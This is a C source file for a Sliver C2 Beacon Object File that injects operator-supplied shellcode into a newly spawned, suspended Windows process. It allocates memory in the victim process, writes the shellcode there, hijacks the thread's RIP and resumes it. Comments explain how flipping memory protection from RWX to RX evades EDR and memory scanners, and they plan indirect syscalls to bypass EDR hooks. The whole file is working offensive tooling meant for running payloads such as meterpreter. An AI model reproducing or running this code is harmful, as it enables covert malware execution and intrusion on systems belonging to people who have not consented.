/*
 * process_hollowing.c — Sliver C2 BOF (Phase 1)
 *
 * Suspended-process shellcode injection via SetThreadContext RIP hijack.
 * Author: wannwann
 *
 * Technique:
 *   1. Spawn <target> in CREATE_SUSPENDED state.
 *   2. VirtualAllocEx a fresh RW region in the victim (size = shellcode len).
 *   3. WriteProcessMemory the operator-supplied shellcode into it.
 *   4. VirtualProtectEx → RWX so self-modifying / encoded decoders can write
 *      to their own body before dispatching.
 *   5. GetThreadContext / set Rip = allocAddr / SetThreadContext.
 *   6. ResumeThread — the thread begins execution at our shellcode.
 *   7. WaitForSingleObject(thread, 100ms) — heuristic wait for decoder to
 *      settle. Returns WAIT_TIMEOUT (0x102) once the wait elapses.
 *   8. VirtualProtectEx → RX — strip the W bit so the region is plain
 *      executable memory, not RWX. Evades memory scanners that flag RWX.
 *
 * Why not entrypoint overwrite:
 *   The previous implementation tried to VirtualProtectEx the victim's
 *   .text entrypoint to RWX and overwrite it. That works for tiny shellcode
 *   (few hundred bytes) but fails for real payloads (~200KB stageless
 *   meterpreter) because the protection change spans out of the image's
 *   .text section / out of the mapped image entirely, and VirtualProtectEx
 *   returns FALSE. Allocating a fresh region has no such size ceiling.
 *
 * Entrypoint: void go(char *args, unsigned long alen)
 * Arguments  : target    (string)  path to victim .exe      (e.g. C:\Windows\System32\notepad.exe)
 *              shellcode (file)    raw x64 shellcode bytes   (operator-side path)
 *
 * Reference  : https://git.smukx.site/smukx/Rust-for-Malware-Development
 * COFFLoader : https://github.com/sliverarmory/COFFLoader
 *
 * Phase 2 (TODO): replace the kernel32 cross-process wrappers with indirect
 * syscalls (NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtual-
 * Memory, NtGetContextThread, NtSetContextThread, NtResumeThread, NtClose)
 * resolved via dynamic SSN (HellsGate / HalosGate) to bypass userland EDR
 * hooks. Functionally identical to Phase 1 — only the call mechanism changes.
 */

#include <windows.h>
#include "beacon.h"

/* ------------------------------------------------------------------ */
/* Win32 API declarations (BOF convention: LIBRARY$FunctionName)      */
/* ------------------------------------------------------------------ */

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessA(
    LPCSTR lpApplicationName, LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAllocEx(
    HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize,
    DWORD flAllocationType, DWORD flProtect);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteProcessMemory(
    HANDLE hProcess, LPVOID lpBaseAddress,
    LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtectEx(
    HANDLE hProcess, LPVOID lpAddress,
    SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$GetThreadContext(
    HANDLE hThread, PCONTEXT lpContext);

DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$SetThreadContext(
    HANDLE hThread, PCONTEXT lpContext);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ResumeThread(HANDLE hThread);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(
    HANDLE hHandle, DWORD dwMilliseconds);

DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE hObject);

/* ------------------------------------------------------------------ */
/* Constants (some from windows.h, defined here for clarity)          */
/* ------------------------------------------------------------------ */

#define CREATE_SUSPENDED        0x4
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READ       0x20
#define PAGE_EXECUTE_READWRITE  0x40
#define DECODER_SETTLE_MS       100
#define WAIT_TIMEOUT_CODE       0x102

void go(char *args, unsigned long alen)
{
    datap parser;
    char *target            = NULL;
    unsigned char *sc       = NULL;
    int   sc_size           = 0;
    STARTUPINFOA si         = {0};
    PROCESS_INFORMATION pi  = {0};
    SIZE_T bytes            = 0;
    HANDLE hProc            = NULL;
    LPVOID allocAddr        = NULL;
    DWORD oldProtect        = 0;
    DWORD waitRes           = 0;
    CONTEXT ctx;

    /* ---------------------------------------------------------- */
    /* 1. Parse arguments                                         */
    /* ---------------------------------------------------------- */
    BeaconDataParse(&parser, args, (int)alen);
    target = BeaconDataExtract(&parser, NULL);

    if (target == NULL || target[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Target path missing. Usage: hollow <target.exe> <shellcode.bin>\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Target process: %s\n", target);

    sc = (unsigned char *)BeaconDataExtract(&parser, &sc_size);
    if (sc == NULL || sc_size <= 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] --shellcode wajib diisi (raw x64 shellcode bytes)\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Shellcode: %d bytes (operator-supplied)\n", sc_size);

    si.cb = sizeof(si);

    /* ---------------------------------------------------------- */
    /* 2. CreateProcessA — SUSPENDED                              */
    /* ---------------------------------------------------------- */
    if (!KERNEL32$CreateProcessA(
            target,
            NULL, NULL, NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL, NULL,
            &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CreateProcessA failed (check target path / permissions)\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Spawned %s (pid=%lu, tid=%lu) [SUSPENDED]\n",
        target, pi.dwProcessId, pi.dwThreadId);
    hProc = pi.hProcess;

    /* ---------------------------------------------------------- */
    /* 3. VirtualAllocEx — fresh RW region (size = sc_size)       */
    /* ------------------------------------------------------------ *
     * Allocate as PAGE_READWRITE, not RWX. RWX-at-alloc-time is a
     * classic EDR signal. We flip to RWX only after writing, and
     * flip back to RX after the decoder settles.
     * ---------------------------------------------------------- */
    allocAddr = KERNEL32$VirtualAllocEx(
        hProc, NULL, (SIZE_T)sc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (allocAddr == NULL) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] VirtualAllocEx failed (size=%d)\n", sc_size);
        goto cleanup_proc;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] VirtualAllocEx @ 0x%p (RW, %d bytes)\n",
        allocAddr, sc_size);

    /* ---------------------------------------------------------- */
    /* 4. WriteProcessMemory — inject shellcode                   */
    /* ---------------------------------------------------------- */
    if (!KERNEL32$WriteProcessMemory(
            hProc, allocAddr,
            sc, (SIZE_T)sc_size, &bytes)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] WriteProcessMemory failed\n");
        goto cleanup_proc;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Wrote %lu bytes of shellcode @ 0x%p\n",
        (unsigned long)bytes, allocAddr);

    /* ---------------------------------------------------------- */
    /* 5. VirtualProtectEx → RWX (let decoder self-write)        */
    /* ------------------------------------------------------------ *
     * Many encoded payloads (msfvenom x64/xor, shikata_ga_nai,
     * etc.) self-modify during their first instructions. The
     * decoder stub writes (XOR / SUB / ADD) into its own .text
     * bytes before jumping to the decoded payload. RWX allows
     * that write; a plain RX region would trip an access violation
     * on the first decode instruction and silently kill the
     * hollowed thread.
     * ---------------------------------------------------------- */
    if (!KERNEL32$VirtualProtectEx(
            hProc, allocAddr, (SIZE_T)sc_size,
            PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] VirtualProtectEx(RWX) failed\n");
        goto cleanup_proc;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] VirtualProtectEx → RWX (was 0x%x, decoder can self-write)\n",
        (unsigned)oldProtect);

    /* ---------------------------------------------------------- */
    /* 6. GetThreadContext — read current RIP                     */
    /* ------------------------------------------------------------ *
     * CONTEXT_CONTROL only — we just want the instruction pointer
     * (Rip). Saves cross-process reads of the integer register
     * file we don't need.
     * ---------------------------------------------------------- */
    {
        DWORD i;
        unsigned char *p = (unsigned char *)&ctx;
        for (i = 0; i < (DWORD)sizeof(ctx); i++) p[i] = 0;
    }
    ctx.ContextFlags = CONTEXT_CONTROL;

    if (!KERNEL32$GetThreadContext(pi.hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] GetThreadContext failed\n");
        goto cleanup_proc;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] GetThreadContext: Rip was 0x%llx\n",
        (unsigned long long)ctx.Rip);

    /* ---------------------------------------------------------- */
    /* 7. SetThreadContext — redirect Rip to allocAddr            */
    /* ---------------------------------------------------------- */
    ctx.Rip = (DWORD64)allocAddr;

    if (!KERNEL32$SetThreadContext(pi.hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] SetThreadContext failed\n");
        goto cleanup_proc;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] SetThreadContext: Rip now 0x%llx (allocAddr)\n",
        (unsigned long long)ctx.Rip);

    /* ---------------------------------------------------------- */
    /* 8. ResumeThread — let shellcode run                        */
    /* ---------------------------------------------------------- */
    {
        DWORD prev = KERNEL32$ResumeThread(pi.hThread);
        if (prev == (DWORD)-1) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] ResumeThread failed\n");
            goto cleanup_proc;
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Resumed thread (previous suspend count=%lu)\n", prev);
    }

    /* ---------------------------------------------------------- */
    /* 9. WaitForSingleObject(thread, 100ms) — decoder settle     */
    /* ------------------------------------------------------------ *
     * Decoder stubs for msfvenom-encoded payloads finish in
     * microseconds. Waiting 100ms is a coarse heuristic; the
     * function returns WAIT_TIMEOUT (0x102) once the wait elapses
     * (decoder has long since completed). Payloads not encoded
     * simply run past this wait — their thread is still alive
     * (e.g. reverse shell blocked on connect()), WaitForSingleObject
     * still returns WAIT_TIMEOUT, which is what we want.
     * ---------------------------------------------------------- */
    waitRes = KERNEL32$WaitForSingleObject(pi.hThread, DECODER_SETTLE_MS);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] WaitForSingleObject(%dms) → %lu (258=TIMEOUT, expected)\n",
        DECODER_SETTLE_MS, (unsigned long)waitRes);

    /* ---------------------------------------------------------- */
    /* 10. VirtualProtectEx → RX (strip W bit)                   */
    /* ------------------------------------------------------------ *
     * Region becomes plain PAGE_EXECUTE_READ. Memory scanners that
     * look for RWX regions in remote processes will miss this one.
     * Safe only because the decoder (if any) has finished — a self-
     * modifying payload that writes here again would crash. That
     * is not normal post-decode behaviour for stock msfvenom /
     * stageless meterpreter.
     * ---------------------------------------------------------- */
    {
        DWORD tmp = 0;
        if (!KERNEL32$VirtualProtectEx(
                hProc, allocAddr, (SIZE_T)sc_size,
                PAGE_EXECUTE_READ, &tmp)) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] VirtualProtectEx(RX) failed — region stays RWX\n");
            /* non-fatal: shellcode is already running, leave RWX */
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] VirtualProtectEx → RX (write stripped)\n");
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Process hollowing complete. Shellcode running under %s (pid=%lu)\n",
        target, pi.dwProcessId);

    /* fallthrough into cleanup */

cleanup_proc:
    if (pi.hThread) KERNEL32$CloseHandle(pi.hThread);
    if (pi.hProcess) KERNEL32$CloseHandle(pi.hProcess);
}